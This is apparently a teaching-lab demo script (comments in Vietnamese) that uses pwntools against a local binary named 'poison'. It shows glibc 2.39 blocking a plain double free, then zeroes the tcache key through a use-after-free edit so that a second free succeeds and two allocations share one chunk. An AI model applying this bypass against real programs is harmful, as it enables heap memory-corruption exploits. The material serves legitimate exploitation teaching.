#!/usr/bin/env python3
# Lab 9.3 demo phu: (A) double free bi glibc 2.39 chan, (B) xoa key de vuot qua.
from pwn import *
context.binary = ELF('./poison'); context.log_level='error'
def alloc(io,i): io.sendlineafter(b'> ',b'1'); io.sendlineafter(b'idx> ',str(i).encode())
def free(io,i):  io.sendlineafter(b'> ',b'2'); io.sendlineafter(b'idx> ',str(i).encode())
def edit(io,i,d):io.sendlineafter(b'> ',b'3'); io.sendlineafter(b'idx> ',str(i).encode()); io.sendafter(b'data> ',d)

# (A) double free khong xu ly key -> abort
io = process('./poison')
alloc(io,0); free(io,0); free(io,0)
print('[A] free(0) hai lan:')
print('   ', io.recvall(timeout=3).decode(errors='replace').strip().splitlines()[-1])

# (B) xoa key roi free lai -> OK. Chung minh dup: 2 malloc ra cung chunk.
io = process('./poison')
alloc(io,0); free(io,0)
edit(io,0, p64(0)+p64(0))     # byte 0-7: fd=0, byte 8-15: key=0 -> xoa tcache_key
free(io,0)                    # lan 2: key != tcache_key -> khong bi chan
print('[B] sau khi xoa key, free(0) lan 2:', io.recvline_contains(b'freed', timeout=3).decode().strip())
alloc(io,1); alloc(io,2)      # slot1, slot2 tro cung mot chunk (dup)
edit(io,1, b'MARK_FROM_SLOT1\x00')
io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx> ', b'2')
print('[B] show(slot2) 8 byte dau =', io.recv(8))  # thay du lieu ghi qua slot1 -> cung chunk
io.close()
